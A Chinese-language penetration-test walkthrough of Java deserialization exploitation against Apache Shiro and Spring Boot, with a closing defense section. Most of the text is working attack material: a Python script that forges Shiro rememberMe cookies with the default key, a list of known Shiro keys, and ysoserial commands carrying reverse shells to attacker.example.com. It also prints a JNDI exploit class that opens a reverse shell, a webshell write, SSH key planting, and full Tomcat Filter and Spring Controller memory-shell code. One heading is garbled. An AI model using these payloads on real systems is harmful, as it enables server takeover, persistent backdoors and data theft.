# Java反序列化漏洞实战案例

## 一、案例背景

### 1.1 目标系统概述

**目标系统**：某企业Java应用系统
- **系统地址**：http://javaapp.example.com
- **系统类型**：Java Spring Boot + Apache Shiro
- **中间件**：Apache Tomcat 9.0.30
- **测试范围**：授权渗透测试
- **测试时间**：2024年X月X日

### 1.2 测试目标

1. 发现反序列化漏洞点
2. 分析可利用的Gadget链
3. 构造恶意Payload
4. 实现远程代码执行
5. 获取回显/植入内存马
6. 提供修复方案

### 1.3 测试工具

| 工具名称 | 用途 |
|---------|------|
| Burp Suite | 抓包分析 |
| ysoserial | Payload生成 |
| marshalsec | JNDI服务 |
| JNDIExploit | JNDI利用工具 |
| Java反编译工具 | 代码分析 |

---

## 二、反序列化点发现

### 2.1 信息收集

#### 2.1.1 技术栈识别

通过响应头和错误页面识别：

```
Server: Apache-Coyote/1.1
X-Application: Spring Boot
Set-Cookie: JSESSIONID=...; rememberMe=deleteMe
```

发现使用Apache Shiro框架，存在`rememberMe`字段。

#### 2.1.2 依赖分析

通过错误页面或下载jar包分析依赖：

```
spring-boot-starter-web
spring-boot-starter-security
shiro-spring-boot-starter
commons-collections4
commons-beanutils
```

### 2.2 Shiro反序列化检测

#### 2.2.1 rememberMe字段分析

**原始请求**：
```http
GET /admin HTTP/1.1
Host: javaapp.example.com
Cookie: JSESSIONID=abc123
```

**响应**：
```http
HTTP/1.1 302 Found
Set-Cookie: rememberMe=deleteMe; Max-Age=0; Expires=Thu, 01-Jan-1970 00:00:10 GMT
Location: /login
```

存在`rememberMe=deleteMe`，说明使用Shiro的RememberMe功能。

#### 2.2.2 发送测试Payload

使用ysoserial生成测试Payload：

```bash
java -jar ysoserial.jar CommonsCollections2 "ping test.example.com" | base64 -w 0
```

**发送请求**：
```http
GET /admin HTTP/1.1
Host: javaapp.example.com
Cookie: rememberMe=[生成的Base64 Payload]
```

观察DNSLog是否收到请求，确认漏洞存在。

### 2.3 其他反序列化点探测

#### 2.3.1 Java序列化数据特征

Java序列化数据以`ac ed 00 05`开头（十六进制）。

Base64编码后以`rO0AB`开头。

#### 2.3.2 常见入口点

| 入口点 | 检测方法 |
|--------|----------|
| Shiro rememberMe | 检测Cookie中的rememberMe |
| WebLogic T3协议 | 检测T3协议端口 |
| JMX RMI | 检测RMI端口 |
| HTTP请求体 | 检测rO0AB开头的数据 |
| 文件上传 | 上传序列化文件 |

---

## 三、Gadget链分析

### 3.1 常见Gadget链

#### 3.1.1 Apache Commons Collections

**依赖版本**：commons-collections <= 3.2.1

**利用链**：
```
AnnotationInvocationHandler.readObject()
  -> HashMap.entrySet()
    -> TiedMapEntry.getValue()
      -> LazyMap.get()
        -> ChainedTransformer.transform()
          -> Runtime.exec()
```

**ysoserial Payload**：
```bash
java -jar ysoserial.jar CommonsCollections1 "id"
java -jar ysoserial.jar CommonsCollections6 "id"
```

#### 3.1.2 CommonsBeanutils

**依赖版本**：commons-beanutils <= 1.9.2

**利用链**：
```
BeanComparator.compare()
  -> PropertyUtils.getProperty()
    -> Runtime.exec()
```

**ysoserial Payload**：
```bash
java -jar ysoserial.jar CommonsBeanutils1 "id"
```

#### 3.1.3 JDK7u21

**适用版本**：JDK 7u21之前

**利用链**：
```
AnnotationInvocationHandler.readObject()
  -> HashMap.put()
    -> Proxy.equals()
      -> AnnotationInvocationHandler.invoke()
        -> Runtime.exec()
```

**ysoserial Payload**：
```bash
java -jar ysoserial.jar Jdk7u21 "id"
```

#### 3.1.4 JDK8u20

**适用版本**：JDK 8u20之前

**ysoserial Payload**：
```bash
java -jar ysoserial.jar Jdk8u20 "id"
```

### 3.2 Shiro专用Gadget链

#### 3.2.1 Shiro默认密钥

Shiro <= 1.2.4 使用硬编码密钥：

```java
private static final byte[] DEFAULT_CIPHER_KEY_BYTES = Base64.decode("kPH+bIxk5D2deZiIxcaaaA==");
```

#### 3.2.2 密钥爆破

使用工具爆破Shiro密钥：

```bash
java -jar shiro_attack.jar -t http://javaapp.example.com -f keys.txt
```

**常见密钥列表**：
```
kPH+bIxk5D2deZiIxcaaaA==
4AvVhmFLUs0TAELKyoYTpQ==
Z3VucwAAAAAAAAAAAAAAAA==
fCq+/nW6+eYah9b3C4wYgQ==
...
```

#### 3.2.3 CB1链（无依赖）

针对Shiro的无外部依赖链：

```bash
java -jar ysoserial.jar -g CommonsBeanutils1 -p "id" -o base64
```

---

## 四、Payload构造

### 4.1 使用ysoserial生成

#### 4.1.1 基硋试令执行

```bash
# Linux命令
java -jar ysoserial.jar CommonsCollections5 "touch /tmp/pwned"

# 带参数命令
java -jar ysoserial.jar CommonsCollections5 "bash -c 'bash -i >& /dev/tcp/attacker.example.com/4444 0>&1'"
```

#### 4.1.2 Base64编码输出

```bash
java -jar ysoserial.jar CommonsCollections5 "id" | base64 -w 0 > payload.txt
```

### 4.2 Shiro Payload构造

#### 4.2.1 加密流程

```
1. 生成序列化Payload
2. 使用Shiro密钥AES加密
3. Base64编码
4. 放入rememberMe Cookie
```

#### 4.2.2 使用工具生成

```bash
# 使用shiro_tool
java -jar shiro_tool.jar -g CommonsBeanutils1 -p "id" -k "kPH+bIxk5D2deZiIxcaaaA=="

# 使用ysoserial配合Shiro加密
java -jar ysoserial.jar CommonsBeanutils1 "id" | java -jar shiro_encrypt.jar "kPH+bIxk5D2deZiIxcaaaA=="
```

#### 4.2.3 Python脚本生成

```python
import base64
import subprocess
from Crypto.Cipher import AES

def generate_shiro_payload(command, key="kPH+bIxk5D2deZiIxcaaaA=="):
    # 生成ysoserial payload
    ysoserial_cmd = f"java -jar ysoserial.jar CommonsBeanutils1 '{command}'"
    payload = subprocess.check_output(ysoserial_cmd, shell=True)
    
    # AES加密
    key_bytes = base64.b64decode(key)
    cipher = AES.new(key_bytes, AES.MODE_CBC, iv=b'\x00' * 16)
    
    # PKCS5填充
    pad_len = 16 - len(payload) % 16
    payload = payload + bytes([pad_len]) * pad_len
    
    encrypted = cipher.encrypt(payload)
    
    # Base64编码
    return base64.b64encode(encrypted).decode()

# 生成Payload
payload = generate_shiro_payload("id")
print(f"rememberMe={payload}")
```

### 4.3 URLDNS Payload（无依赖）

用于检测反序列化漏洞：

```bash
java -jar ysoserial.jar URLDNS "http://test.example.com"
```

通过DNS请求确认反序列化执行。

---

## 五、RCE利用

### 5.1 命令执行

#### 5.1.1 直接执行命令

```bash
# Linux
java -jar ysoserial.jar CommonsCollections5 "id"

# Windows
java -jar ysoserial.jar CommonsCollections5 "cmd /c whoami"
```

#### 5.1.2 反弹Shell

```bash
# Bash反弹Shell
java -jar ysoserial.jar CommonsCollections5 "bash -c 'bash -i >& /dev/tcp/attacker.example.com/4444 0>&1'"

# 使用编码绕过
java -jar ysoserial.jar CommonsCollections5 "bash -c 'echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC40LzEyMzQgMD4mMQ== | base64 -d | bash'"
```

### 5.2 写入文件

#### 5.2.1 写入WebShell

```bash
# 写入JSP WebShell
java -jar ysoserial.jar CommonsCollections5 "echo '<%@ page language=\"java\" import=\"java.util.*\" %><% Runtime.getRuntime().exec(request.getParameter(\"cmd\")); %>' > /var/www/html/shell.jsp"
```

#### 5.2.2 写入SSH公钥

```bash
java -jar ysoserial.jar CommonsCollections5 "mkdir -p /root/.ssh && echo 'ssh-rsa AAAAB3NzaC1yc2E...' >> /root/.ssh/authorized_keys"
```

### 5.3 JNDI注入

#### 5.3.1 启动JNDI服务

```bash
# 使用JNDIExploit
java -jar JNDIExploit.jar -i attacker.example.com -l 1389 -p 8888

# 使用marshalsec
java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer "http://attacker.example.com:8888/#Exploit" 1389
```

#### 5.3.2 构造JNDI Payload

```bash
# JNDI + RMI
java -jar ysoserial.jar JndiRef "rmi://attacker.example.com:1099/Exploit"

# JNDI + LDAP
java -jar ysoserial.jar JndiRef "ldap://attacker.example.com:1389/Exploit"
```

#### 5.3.3 恶意类构造

**Exploit.java**：
```java
import javax.naming.Context;
import javax.naming.Name;
import javax.naming.spi.ObjectFactory;
import java.util.Hashtable;

public class Exploit implements ObjectFactory {
    static {
        try {
            Runtime.getRuntime().exec("bash -c 'bash -i >& /dev/tcp/attacker.example.com/4444 0>&1'");
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    @Override
    public Object getObjectInstance(Object obj, Name name, Context nameCtx, Hashtable<?, ?> environment) {
        return null;
    }
}
```

编译并托管：
```bash
javac Exploit.java
python3 -m http.server 8888
```

---

## 六、回显获取

### 6.1 为什么需要回显

直接RCE无法看到命令输出，需要构造回显机制。

### 6.2 Tomcat回显构造

#### 6.2.1 基于Response回显

```java
// 获取Response对象
Field requestField = Response.class.getDeclaredField("request");
requestField.setAccessible(true);
Request request = (Request) requestField.get(response);

// 执行命令并写入Response
String cmd = request.getParameter("cmd");
String result = executeCommand(cmd);
response.getWriter().write(result);
```

#### 6.2.2 使用工具构造回显

```bash
# 使用回显版ysoserial
java -jar ysoserial-echo.jar CommonsCollections5 "id" -e tomcat

# 或使用回显工具
java -jar EchoTool.jar -t http://javaapp.example.com -g CommonsCollections5 -c "id"
```

### 6.3 基于异常回显

```java
// 抛出包含命令结果的异常
String result = executeCommand(cmd);
throw new Exception(result);
```

### 6.4 基于日志回显

```java
// 写入日志文件
String result = executeCommand(cmd);
Logger.getLogger("exploit").info(result);

// 然后访问日志文件获取结果
```

### 6.5 内存马回显

在内存中注入Servlet/Filter，提供命令执行接口。

---

## 七、内存马植入

### 7.1 内存马原理

内存马是无文件WebShell，通过动态注册Servlet/Filter/Listener实现。

### 7.2 Tomcat Filter内存马

#### 7.2.1 Filter内存马代码

```java
import org.apache.catalina.core.ApplicationContext;
import org.apache.catalina.core.ApplicationContextFacade;
import org.apache.catalina.core.StandardContext;
import javax.servlet.*;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.Map;

public class FilterMemshell implements Filter {
    
    static {
        try {
            // 获取StandardContext
            Field field = ApplicationContextFacade.class.getDeclaredField("context");
            field.setAccessible(true);
            ApplicationContext applicationContext = (ApplicationContext) field.get(new ApplicationContextFacade(null));
            
            Field contextField = ApplicationContext.class.getDeclaredField("context");
            contextField.setAccessible(true);
            StandardContext standardContext = (StandardContext) contextField.get(applicationContext);
            
            // 创建Filter配置
            FilterDef filterDef = new FilterDef();
            filterDef.setFilterName("evil");
            filterDef.setFilter(new FilterMemshell());
            filterDef.setFilterClass(FilterMemshell.class.getName());
            standardContext.addFilterDef(filterDef);
            
            // 创建Filter映射
            FilterMap filterMap = new FilterMap();
            filterMap.setFilterName("evil");
            filterMap.setURLPattern("/*");
            standardContext.addFilterMap(filterMap);
            
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
    
    @Override
    public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain) 
            throws IOException, ServletException {
        HttpServletRequest req = (HttpServletRequest) request;
        HttpServletResponse resp = (HttpServletResponse) response;
        
        String cmd = req.getParameter("cmd");
        if (cmd != null) {
            try {
                Process process = Runtime.getRuntime().exec(cmd);
                java.io.InputStream inputStream = process.getInputStream();
                java.util.Scanner scanner = new java.util.Scanner(inputStream).useDelimiter("\\A");
                String output = scanner.hasNext() ? scanner.next() : "";
                resp.getWriter().write(output);
                return;
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
        
        chain.doFilter(request, response);
    }
    
    @Override
    public void init(FilterConfig filterConfig) throws ServletException {}
    
    @Override
    public void destroy() {}
}
```

#### 7.2.2 注入内存马

```bash
# 使用工具注入
java -jar ysoserial.jar CommonsCollections5 "$(cat memshell.jsp)"

# 或使用专门的内存马工具
java -jar MemshellTool.jar -t http://javaapp.example.com -g CommonsCollections5
```

### 7.3 Spring Controller内存马

```java
import org.springframework.web.context.WebApplicationContext;
import org.springframework.web.context.request.RequestContextHolder;
import org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;
import org.springframework.web.bind.annotation.*;

public class ControllerMemshell {
    
    static {
        try {
            WebApplicationContext context = (WebApplicationContext) RequestContextHolder.currentRequestAttributes()
                    .getAttribute("org.springframework.web.servlet.DispatcherServlet.CONTEXT", 0);
            
            RequestMappingHandlerMapping mapping = context.getBean(RequestMappingHandlerMapping.class);
            
            Method method = ControllerMemshell.class.getMethod("evil", String.class);
            RequestMappingInfo info = RequestMappingInfo.paths("/evil").build();
            
            mapping.registerMapping(info, new ControllerMemshell(), method);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
    
    @ResponseBody
    public String evil(@RequestParam("cmd") String cmd) {
        try {
            Process process = Runtime.getRuntime().exec(cmd);
            java.io.InputStream inputStream = process.getInputStream();
            java.util.Scanner scanner = new java.util.Scanner(inputStream).useDelimiter("\\A");
            return scanner.hasNext() ? scanner.next() : "";
        } catch (Exception e) {
            return e.getMessage();
        }
    }
}
```

### 7.4 验证内存马

```bash
# 访问注入的内存马
curl http://javaapp.example.com/?cmd=id
curl http://javaapp.example.com/evil?cmd=id

# 响应
uid=0(root) gid=0(root) groups=0(root)
```

---

## 八、防御方案

### 8.1 代码层面修复

#### 8.1.1 避免不安全的反序列化

```java
// 危险代码
ObjectInputStream ois = new ObjectInputStream(input);
Object obj = ois.readObject();

// 安全替代方案
// 1. 使用JSON/XML等安全格式
ObjectMapper mapper = new ObjectMapper();
Object obj = mapper.readValue(input, MyClass.class);

// 2. 使用白名单过滤
public class SafeObjectInputStream extends ObjectInputStream {
    private static final Set<String> ALLOWED_CLASSES = Set.of(
        "java.lang.String",
        "java.lang.Integer",
        "com.example.SafeClass"
    );
    
    @Override
    protected Class<?> resolveClass(ObjectStreamClass desc) throws IOException, ClassNotFoundException {
        if (!ALLOWED_CLASSES.contains(desc.getName())) {
            throw new InvalidClassException("Unauthorized deserialization attempt", desc.getName());
        }
        return super.resolveClass(desc);
    }
}
```

#### 8.1.2 配置反序列化过滤器（JEP290）

Java 9+内置反序列化过滤器：

```java
// 配置全局过滤器
ObjectInputFilter.Config.setSerialFilter(
    ObjectInputFilter.Config.createFilter(
        "java.lang.String;!*"
    )
);
```

JVM参数：
```bash
-Djdk.serialFilter=java.lang.String;java.lang.Integer;com.example.*
```

### 8.2 Shiro加固

#### 8.2.1 升级Shiro版本

升级到Shiro 1.2.5+或更新版本。

#### 8.2.2 更换密钥

```java
@Bean
public RememberMeManager rememberMeManager() {
    CookieRememberMeManager manager = new CookieRememberMeManager();
    // 使用强随机密钥
    byte[] key = new byte[16];
    new SecureRandom().nextBytes(key);
    manager.setCipherKey(key);
    return manager;
}
```

#### 8.2.3 禁用RememberMe

```java
@Bean
public SecurityManager securityManager() {
    DefaultWebSecurityManager manager = new DefaultWebSecurityManager();
    manager.setRememberMeManager(null); // 禁用
    return manager;
}
```

### 8.3 依赖管理

#### 8.3.1 移除危险依赖

```xml
<!-- 移除或升级commons-collections -->
<!-- <dependency>
    <groupId>commons-collections</groupId>
    <artifactId>commons-collections</artifactId>
    <version>3.2.1</version>
</dependency> -->

<!-- 使用安全版本 -->
<dependency>
    <groupId>org.apache.commons</groupId>
    <artifactId>commons-collections4</artifactId>
    <version>4.4</version>
</dependency>
```

#### 8.3.2 使用依赖检查工具

```bash
# 使用OWASP Dependency Check
dependency-check-maven:check

# 使用Snyk
snyk test
```

### 8.4 运行时防护

#### 8.4.1 使用RASP

部署Runtime Application Self-Protection：

```bash
# OpenRASP部署
java -javaagent:openrasp.jar -jar application.jar
```

#### 8.4.2 配置安全策略

```java
// Security Manager策略
System.setSecurityManager(new SecurityManager() {
    @Override
    public void checkExec(String cmd) {
        throw new SecurityException("Command execution denied");
    }
});
```

### 8.5 网络层防护

#### 8.5.1 WAF规则

```
# 检测Java序列化特征
SecRule REQUEST_BODY "@beginsWith rO0AB" \
    "id:1001,phase:2,deny,status:403,msg:'Java Serialization Detected'"

# 检测Shiro rememberMe
SecRule REQUEST_HEADERS:Cookie "@contains rememberMe" \
    "chain,id:1002,phase:1,deny,status:403,msg:'Shiro Deserialization Attack'"
```

#### 8.5.2 禁用危险端口

```bash
# 禁用RMI、T3等端口
iptables -A INPUT -p tcp --dport 1099 -j DROP  # RMI
iptables -A INPUT -p tcp --dport 7001 -j DROP  # T3
```

---

## 九、完整Payload记录

### 9.1 ysoserial Payload

```bash
# Commons Collections
java -jar ysoserial.jar CommonsCollections1 "id"
java -jar ysoserial.jar CommonsCollections5 "id"
java -jar ysoserial.jar CommonsCollections6 "id"
java -jar ysoserial.jar CommonsCollections7 "id"

# Commons Beanutils
java -jar ysoserial.jar CommonsBeanutils1 "id"

# JDK
java -jar ysoserial.jar Jdk7u21 "id"
java -jar ysoserial.jar Jdk8u20 "id"

# URLDNS (检测用)
java -jar ysoserial.jar URLDNS "http://test.example.com"
```

### 9.2 Shiro Payload

```bash
# 使用默认密钥
java -jar shiro_tool.jar -g CommonsBeanutils1 -p "id"

# 指定密钥
java -jar shiro_tool.jar -g CommonsBeanutils1 -p "id" -k "kPH+bIxk5D2deZiIxcaaaA=="

# 密钥爆破
java -jar shiro_attack.jar -t http://target.com -f keys.txt
```

### 9.3 反弹Shell Payload

```bash
# Bash反弹Shell
java -jar ysoserial.jar CommonsCollections5 "bash -c 'bash -i >& /dev/tcp/attacker.com/4444 0>&1'"

# 编码绕过
java -jar ysoserial.jar CommonsCollections5 "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC40LzEyMzQgMD4mMQ==}|{base64,-d}|{bash,-i}"

# Python反弹Shell
java -jar ysoserial.jar CommonsCollections5 "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"attacker.com\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
```

### 9.4 JNDI Payload

```bash
# RMI
java -jar ysoserial.jar JndiRef "rmi://attacker.com:1099/Exploit"

# LDAP
java -jar ysoserial.jar JndiRef "ldap://attacker.com:1389/Exploit"

# JNDIExploit
java -jar JNDIExploit.jar -i attacker.com -l 1389 -p 8888
```

---

## 十、总结

### 10.1 漏洞成因

1. **不安全的反序列化**：直接反序列化不可信数据
2. **危险Gadget链**：存在可利用的Gadget链
3. **硬编码密钥**：Shiro默认密钥未更换
4. **依赖漏洞**：使用存在漏洞的第三方库

### 10.2 危害等级

| 危害 | 描述 |
|------|------|
| 远程代码执行 | 可执行任意系统命令 |
| 权限提升 | 可能获取服务器完全控制权 |
| 数据泄露 | 可读取任意文件 |
| 横向移动 | 可攻击内网其他系统 |

### 10.3 修复优先级

1. **立即修复**：更换Shiro密钥或禁用RememberMe
2. **立即修复**：升级存在漏洞的依赖
3. **短期修复**：实现反序列化白名单
4. **中期修复**：部署RASP防护
5. **长期修复**：安全开发培训

### 10.4 检测建议

1. 检查是否使用Java序列化
2. 审计所有反序列化入口点
3. 检查依赖是否存在已知漏洞
4. 检查Shiro配置是否使用默认密钥
5. 定期进行渗透测试

---

## 附录：常见Java反序列化漏洞

| 漏洞 | 组件 | CVE |
|------|------|-----|
| Shiro反序列化 | Apache Shiro | CVE-2016-4437 |
| WebLogic T3 | Oracle WebLogic | CVE-2015-4852 |
| Fastjson | Alibaba Fastjson | CVE-2017-18349 |
| Log4j | Apache Log4j | CVE-2021-44228 |
| Jenkins | Jenkins CI | CVE-2017-1000353 |
| JBoss | Red Hat JBoss | CVE-2017-12149 |
| WebSphere | IBM WebSphere | CVE-2019-8403 |

---

> **免责声明**：本文档仅用于授权的安全测试和教育目的。未经授权对他人系统进行渗透测试属于违法行为，请遵守当地法律法规。
